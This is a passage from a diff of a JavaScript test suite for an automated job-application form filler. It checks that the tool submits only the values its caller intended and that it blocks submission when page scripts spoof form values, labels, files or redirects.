+        { type: 'fill', selector: '#native-code', value: 'abc', label: 'applicant_code' }
+      ]
+    );
+    assert.equal(status, 0, JSON.stringify(error));
+    assert.deepEqual(recorded, []);
+    assert.deepEqual(requests, []);
+    assert.equal(result.submitOutcome.pressed, false);
+    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
+    assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
+  });
+}
+
+for (const constraintMutation of [
+  ['pattern removal', '/native-constraint-pattern-removal', 'protected_surface_mutated'],
+  ['setCustomValidity clear', '/native-constraint-custom-validity-clear', 'click_binding_changed']
+]) {
+  test('v4 rejects submit-time constraint mutation through ' + constraintMutation[0], async () => {
+    const { status, result, error, clicks: recorded, requests } = await runV4(
+      constraintMutation[1],
+      [
+        ...minimalV4Fills('#native-email', '#native-resume'),
+        { type: 'fill', selector: '#native-code', value: 'abc', label: 'applicant_code' }
+      ]
+    );
+    assert.equal(status, 0, JSON.stringify(error));
+    assert.deepEqual(recorded, []);
+    assert.deepEqual(requests, []);
+    assert.equal(result.submitOutcome.pressed, false);
+    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, constraintMutation[2]);
+    assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
+  });
+}
 
 test('v4 blocks a POST-preserving 307 redirect after the caller-bound endpoint', async () => {
   const { status, result, error, clicks: recorded, requests } = await runV4(
@@ -2620,11 +4479,11 @@ test('v4 blocks a POST-preserving 307 redirect after the caller-bound endpoint',
   );
   assert.equal(status, 0, JSON.stringify(error));
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, [{
-    method: 'POST',
-    path: '/native-redirect-307',
-    body: 'email=applicant%40example.com&resume=resume.pdf'
-  }]);
+  assert.equal(requests.length, 1);
+  assertMultipartPost(requests[0], '/native-redirect-307', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
+  ]);
   assert.equal(result.submitOutcome.pressed, true);
   assert.equal(result.submitOutcome.transportDisposition, 'write_redirect_blocked');
   assert.equal(result.submitOutcome.observationDisposition, 'post_submit_observation_failed');
@@ -2637,45 +4496,1075 @@ test('v4 allows a normal GET receipt redirect after the caller-bound POST', asyn
   );
   assert.equal(status, 0, JSON.stringify(error));
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, [
-    {
-      method: 'POST',
-      path: '/native-receipt-redirect',
-      body: 'email=applicant%40example.com&resume=resume.pdf'
-    },
-    { method: 'GET', path: '/native-receipt', body: '' }
+  assert.equal(requests.length, 2);
+  assertMultipartPost(requests[0], '/native-receipt-redirect', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
   ]);
+  assert.deepEqual(requests[1], { method: 'GET', path: '/native-receipt', body: '' });
   assert.equal(result.submitOutcome.pressed, true);
   assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
+  assert.match(result.url, /\/native-receipt$/);
+});
+
+test('v4 blocks receipt redirect userinfo before the descendant GET', async () => {
+  const run = await runV4(
+    '/native-redirect-userinfo-receipt',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(run.requests.length, 1);
+  assertMultipartPost(run.requests[0], '/native-receipt-userinfo-redirect', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
+  ]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.submitOutcome.transportDisposition, 'receipt_redirect_blocked');
+});
+
+test('v4 preserves redirect cookies and the committed receipt URL through the pinned GET hop', async () => {
+  const run = await runV4(
+    '/native-redirect-cookie-receipt',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(run.requests.length, 2);
+  assertMultipartPost(run.requests[0], '/native-receipt-cookie-redirect', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
+  ]);
+  assert.deepEqual(run.requests[1], {
+    method: 'GET',
+    path: '/native-receipt-cookie',
+    body: '',
+    cookie: 'receipt_session=ready'
+  });
+  assert.match(run.result.url, /\/native-receipt-cookie$/);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 strips the receipt fragment only from the pinned network hop and preserves it in page URL', async () => {
+  const run = await runV4(
+    '/native-redirect-fragment-receipt',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(run.requests.length, 2);
+  assertMultipartPost(run.requests[0], '/native-receipt-fragment-redirect', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume')
+  ]);
+  assert.deepEqual(run.requests[1], { method: 'GET', path: '/native-receipt', body: '' });
+  assert.match(run.result.url, /\/native-receipt#done$/);
+  assert.equal(run.result.submitOutcome.pressed, true);
 });
 
 for (const serializerCase of [
   {
-    name: 'an empty',
+    name: 'preserves field order with an empty file',
     fixture: '/native-serializer-empty-file',
     populateFile: false,
-    body: 'email=applicant%40example.com&role=engineering&resume=&decision=apply'
+    body: 'email=applicant%40example.com&role=engineering&resume=&decision=apply',
+    supported: true
   },
   {
-    name: 'a populated',
+    name: 'rejects a populated file',
     fixture: '/native-serializer-populated-file',
     populateFile: true,
-    body: 'email=applicant%40example.com&role=engineering&resume=resume.pdf&decision=apply'
+    supported: false
   }
 ]) {
-  test('v4 native urlencoded serializer preserves field order with ' + serializerCase.name + ' file', async () => {
+  test('v4 native urlencoded serializer ' + serializerCase.name, async () => {
     const { status, result, error, clicks: recorded, requests } = await runV4(
       serializerCase.fixture,
       nativeSerializerV4Fills(serializerCase.populateFile)
     );
     assert.equal(status, 0, JSON.stringify(error));
     assert.deepEqual(recorded, []);
-    assert.deepEqual(requests, [{ method: 'POST', path: '/native-real', body: serializerCase.body }], JSON.stringify(result));
-    assert.equal(result.submitOutcome.pressed, true);
-    assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
-    assert.equal(result.finalSubmitChooser.outcome, 'selected');
+    if (serializerCase.supported) {
+      assert.deepEqual(requests, [{ method: 'POST', path: '/native-real', body: serializerCase.body }]);
+      assert.equal(result.submitOutcome.pressed, true);
+      assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
+      assert.equal(result.finalSubmitChooser.outcome, 'selected');
+    } else {
+      assert.deepEqual(requests, []);
+      assert.equal(result.submitOutcome.pressed, false);
+      assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+      assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
+      assert.equal(result.finalSubmitChooser.outcome, 'transport_unsupported');
+    }
   });
 }
+
+test('v4 native multipart serializer preserves ordered fields and exact file bytes', async () => {
+  const fileBytes = Buffer.from([0, 255, 1, 2, 13, 10, 128]);
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-multipart-serializer',
+    [
+      { type: 'fill', selector: '#multipart-email', value: 'applicant@example.com', label: 'email' },
+      {
+        type: 'upload',
+        selector: '#multipart-resume',
+        label: 'resume',
+        file: {
+          name: 'resume.pdf',
+          mimeType: 'application/pdf',
+          base64: fileBytes.toString('base64')
+        }
+      }
+    ]
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.equal(requests.length, 1, JSON.stringify({ result, error, requests }, null, 2));
+  assert.equal(requests[0].method, 'POST');
+  assert.equal(requests[0].path, '/native-multipart-real');
+  assert.deepEqual(recordedMultipartParts(requests[0]), [
+    { name: 'email', bytesBase64: Buffer.from('applicant@example.com').toString('base64') },
+    { name: 'role', bytesBase64: Buffer.from('engineering').toString('base64') },
+    { name: 'role', bytesBase64: Buffer.from('security').toString('base64') },
+    {
+      name: 'resume',
+      filename: 'resume.pdf',
+      contentType: 'application/pdf',
+      bytesBase64: fileBytes.toString('base64')
+    },
+    { name: 'decision', bytesBase64: Buffer.from('apply').toString('base64') }
+  ]);
+  assert.equal(result.submitOutcome.pressed, true);
+  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
+  assert.equal(result.finalSubmitChooser.outcome, 'selected');
+});
+
+test('v4 native multipart serializer preserves an empty file part', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-multipart-serializer-empty',
+    [{ type: 'fill', selector: '#multipart-email', value: 'applicant@example.com', label: 'email' }]
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.equal(requests.length, 1);
+  assert.equal(requests[0].method, 'POST');
+  assert.equal(requests[0].path, '/native-multipart-real');
+  assert.deepEqual(recordedMultipartParts(requests[0]), [
+    { name: 'email', bytesBase64: Buffer.from('applicant@example.com').toString('base64') },
+    { name: 'role', bytesBase64: Buffer.from('engineering').toString('base64') },
+    { name: 'role', bytesBase64: Buffer.from('security').toString('base64') },
+    {
+      name: 'resume',
+      filename: '',
+      contentType: 'application/octet-stream',
+      bytesBase64: ''
+    },
+    { name: 'decision', bytesBase64: Buffer.from('apply').toString('base64') }
+  ]);
+  assert.equal(result.submitOutcome.pressed, true);
+  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
+  assert.equal(result.finalSubmitChooser.outcome, 'selected');
+});
+
+test('v4 binds an aria-label-only native choice to the exact outgoing value', async () => {
+  const run = await runV4('/native-aria-label-choice-proof', [
+    { type: 'fill', selector: '#aria-choice-email', value: 'applicant@example.com', label: 'email' },
+    { type: 'fillByLabelText', text: 'Consent choice', value: 'Yes', label: 'consent' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&consent=1'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 ignores an unselected named image submit control in native serialization', async () => {
+  const run = await runV4('/native-unselected-image-control', [
+    { type: 'fill', selector: '#image-control-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 rejects URL userinfo in the native form action before any write', async () => {
+  const run = await runV4('/native-userinfo-action', [
+    { type: 'fill', selector: '#userinfo-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unsupported');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'transport_unsupported');
+});
+
+test('v4 blocks same-metadata file-byte substitution despite page-realm crypto monkeypatches', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-file-byte-substitution',
+    [
+      { type: 'fill', selector: '#integrity-email', value: 'applicant@example.com', label: 'email' },
+      {
+        type: 'upload',
+        selector: '#integrity-resume',
+        label: 'resume',
+        file: {
+          name: 'resume.pdf',
+          mimeType: 'application/pdf',
+          base64: Buffer.from('resume').toString('base64')
+        }
+      },
+      { type: 'click', selector: '#mutate', label: 'review_attachment' }
+    ]
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 binds retained file proof in the same native snapshot as transport serialization', async () => {
+  const run = await runV4('/native-reversible-file-proof-swap', [
+    { type: 'fill', selector: '#reversible-email', value: 'applicant@example.com', label: 'email' },
+    {
+      type: 'upload',
+      selector: '#reversible-resume',
+      label: 'resume',
+      file: {
+        name: 'resume.pdf',
+        mimeType: 'application/pdf',
+        base64: Buffer.from('resume').toString('base64')
+      }
+    },
+    { type: 'click', selector: '#arm-swap', label: 'review_attachment' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+for (const spoofCase of [
+  {
+    name: 'text value getter spoofing',
+    fixture: '/native-text-value-getter-spoof',
+    actions: [{ type: 'fill', selector: '#spoof-email', value: 'applicant@example.com', label: 'email' }]
+  },
+  {
+    name: 'select value getter spoofing',
+    fixture: '/native-select-value-getter-spoof',
+    actions: [{ type: 'select', selector: '#spoof-role', value: 'eng', label: 'role' }]
+  }
+]) {
+  test('v4 blocks ' + spoofCase.name + ' from changing caller-intended payload', async () => {
+    const run = await runV4(spoofCase.fixture, spoofCase.actions);
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.requests, []);
+    assert.equal(run.result.submitOutcome.pressed, false);
+    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+    assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+    assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+  });
+}
+
+test('v4 rejects textarea newline collapse instead of treating whitespace-different text as caller proof', async () => {
+  const run = await runV4(
+    '/native-textarea-whitespace-drift',
+    [{ type: 'fill', selector: '#textarea-answer', value: 'Line one\nLine two', label: 'answer' }],
+    [{ type: 'extract', selector: '#attempted' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(valueOf(run.result, '#attempted'), 'collapsed');
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 rejects hidden native choice label text plus an own value getter as caller authority', async () => {
+  const run = await runV4(
+    '/native-hidden-choice-label-spoof',
+    [{
+      type: 'fillByLabelText',
+      text: 'Work authorization',
+      value: 'Yes',
+      label: 'work_authorization'
+    }],
+    [{ type: 'extract', selector: '#attempted' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(valueOf(run.result, '#attempted'), 'checked');
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 retains a failed legacy verifier write as an integrity blocker for explicit submit', async () => {
+  const run = await runV4(
+    '/native-legacy-verifier-write-drift',
+    [{ type: 'fill', selector: '#legacy-email', value: 'applicant@example.com', label: 'email' }],
+    [{ type: 'extract', selector: '#attempted' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(valueOf(run.result, '#attempted'), 'rewritten');
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 valid native POST survives earliest main-world primordial patches', async () => {
+  const run = await runV4('/native-main-world-primordial-patches', [
+    { type: 'fill', selector: '#primordial-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&capability_state=no'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'selected');
+});
+
+test('v4 does not count nameless controls as bare-Send authority', async () => {
+  const run = await runV4('/native-nameless-proof-controls', [
+    { type: 'fill', selector: '#nameless-first', value: 'Mehek', label: 'first_name' },
+    { type: 'fill', selector: '#nameless-last', value: 'Mandal', label: 'last_name' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation, null);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
+});
+
+test('v4 rejects an extra caller-unintended value injected into a multiple select', async () => {
+  const run = await runV4('/native-multi-select-injection', [
+    { type: 'select', selector: '#multi-role', value: 'eng', label: 'role' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 treats a successful mutation without a pristine form-owner witness as an integrity failure', async () => {
+  const run = await runV4('/native-form-owner-getter-spoof', [
+    { type: 'fill', selector: '#spoof-owner-email', value: 'applicant@example.com', label: 'email' },
+    {
+      type: 'upload',
+      selector: '#spoof-owner-resume',
+      label: 'resume',
+      file: {
+        name: 'resume.pdf',
+        mimeType: 'application/pdf',
+        base64: Buffer.from('resume').toString('base64')
+      }
+    }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 rejects an own innerText getter that forges Continue as Submit application', async () => {
+  const run = await runV4(
+    '/native-forged-submit-label',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+});
+
+test('v4 chooser ignores hidden descendant text when the rendered control says Continue', async () => {
+  const run = await runV4(
+    '/native-hidden-submit-text',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+});
+
+test('v4 rejects a final-looking native submit hidden by an opacity-zero ancestor', async () => {
+  const run = await runV4('/native-opacity-zero-submit', [
+    { type: 'fill', selector: '#opacity-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
+});
+
+test('v4 never auto-mutates an unproved opt-in through a forged decline value', async () => {
+  const run = await runV4(
+    '/native-optin-value-getter-spoof',
+    minimalV4Fills('#optin-email', '#optin-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
+});
+
+test('v4 isolated scan catches an empty aria-required control hidden from page-world selectors', async () => {
+  const run = await runV4(
+    '/native-required-selector-spoof',
+    minimalV4Fills('#required-email', '#required-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "legal" is empty/
+  );
+});
+
+test('v4 isolated scan catches an empty custom combobox hidden from page-world selectors', async () => {
+  const run = await runV4(
+    '/native-custom-required-selector-spoof',
+    minimalV4Fills('#custom-required-email', '#custom-required-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "required-department" is empty/
+  );
+});
+
+test('v4 isolated scan rejects ARIA-only custom answers with no native payload backing', async () => {
+  const run = await runV4(
+    '/native-custom-required-aria-only',
+    minimalV4Fills('#aria-only-email', '#aria-only-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "aria-only-department" is empty/
+  );
+});
+
+test('v4 isolated scan catches an empty control required only by a wrapping label class', async () => {
+  const run = await runV4(
+    '/native-required-class-marker-spoof',
+    minimalV4Fills('#class-only-email', '#class-only-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "class-only-answer" is empty/
+  );
+});
+
+test('v4 isolated scan catches an empty control required only by a literal starred label', async () => {
+  const run = await runV4(
+    '/native-required-star-marker-spoof',
+    minimalV4Fills('#star-only-email', '#star-only-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "star-only-answer" is empty/
+  );
+});
+
+test('v4 isolated scan fails closed on an unassociated literal starred label', async () => {
+  const run = await runV4(
+    '/native-required-unassociated-star-marker-spoof',
+    minimalV4Fills('#star-sibling-email', '#star-sibling-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /Required application control "star-sibling-label" is empty/
+  );
+});
+
+for (const parityCase of [
+  ['a disabled checked radio peer', '/native-required-disabled-choice-peer'],
+  ['an opposite-type checked peer', '/native-required-mixed-choice-peer'],
+  ['a selected disabled option', '/native-required-disabled-option'],
+  ['a selected option inside a disabled optgroup', '/native-required-disabled-optgroup'],
+  ['a checked disabled peer under native radio requiredness', '/native-required-native-disabled-choice-peer'],
+  ['a selected disabled option under native requiredness', '/native-required-native-disabled-option'],
+  ['a disabled optgroup selection under native requiredness', '/native-required-native-disabled-optgroup'],
+  ['an enabled selected option with an empty value', '/native-required-empty-option']
+]) {
+  test('v4 required scan rejects ' + parityCase[0] + ' as native payload evidence', async () => {
+    const run = await runV4(
+      parityCase[1],
+      minimalV4Fills('#parity-email', '#parity-resume')
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.clicks, []);
+    assert.deepEqual(run.requests, []);
+    assert.equal(run.result.submitOutcome.pressed, false);
+    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+    assert.match(
+      run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+      /Required application control "department" is empty/
+    );
+  });
+}
+
+test('v4 does not infer requiredness from a hidden descendant star', async () => {
+  const run = await runV4('/native-optional-hidden-star', [
+    { type: 'fill', selector: '#hidden-star-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&portfolio='
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 accepts a starred legend only when its coherent native radio group is answered', async () => {
+  const run = await runV4('/native-starred-legend-answered', [
+    { type: 'fill', selector: '#legend-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&department=engineering'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 accepts a starred legend with one populated named native backing entry', async () => {
+  const run = await runV4('/native-starred-legend-hidden-backing', [
+    { type: 'fill', selector: '#legend-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&department=engineering'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+for (const ownerFailure of [
+  ['/native-starred-legend-empty', 'starred-legend'],
+  ['/native-custom-required-mixed-group', 'mixed-required-owner'],
+  ['/native-custom-required-display-contents', 'display-required-owner'],
+  ['/native-custom-required-oversized-owner', 'oversized-required-owner']
+]) {
+  test('v4 fails closed when required owner evidence is empty or ambiguous for ' + ownerFailure[1], async () => {
+    const emailSelector = ownerFailure[0].includes('starred')
+      ? '#legend-email'
+      : ownerFailure[0].includes('display')
+        ? '#display-owner-email'
+        : ownerFailure[0].includes('oversized')
+          ? '#oversized-owner-email'
+        : '#mixed-owner-email';
+    const run = await runV4(ownerFailure[0], [
+      { type: 'fill', selector: emailSelector, value: 'applicant@example.com', label: 'email' }
+    ]);
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.requests, []);
+    assert.equal(run.result.submitOutcome.pressed, false);
+    if (ownerFailure[0].includes('oversized')) {
+      assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+      assert.equal(run.result.requiredFieldConfirmation, null);
+    } else {
+      assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+    }
+  });
+}
+
+test('v4 does not block native required controls barred from constraint validation', async () => {
+  const run = await runV4(
+    '/native-barred-required-controls',
+    [{ type: 'fill', selector: '#barred-email', value: 'applicant@example.com', label: 'email' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&readonly_value='
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+for (const externalOwnerCase of [
+  ['a custom aria-required owner', '/native-external-custom-required-empty', 'external-required-owner', '#external-email'],
+  ['an external required marker owner', '/native-external-marker-required-empty', 'department', '#external-email'],
+  ['an external aria-owns owner', '/native-external-aria-owns-empty', 'aria-owns-required-owner', '#aria-owns-email']
+]) {
+  test('v4 catches an empty form-associated backing control under ' + externalOwnerCase[0], async () => {
+    const run = await runV4(
+      externalOwnerCase[1],
+      [{ type: 'fill', selector: externalOwnerCase[3], value: 'applicant@example.com', label: 'email' }]
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.requests, []);
+    assert.equal(run.result.submitOutcome.pressed, false);
+    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+    assert.match(
+      run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+      new RegExp(externalOwnerCase[2])
+    );
+  });
+}
+
+test('v4 accepts an external custom required owner only when its native backing entry is populated', async () => {
+  const run = await runV4(
+    '/native-external-custom-required-answered',
+    [{ type: 'fill', selector: '#external-email', value: 'applicant@example.com', label: 'email' }]
+  );
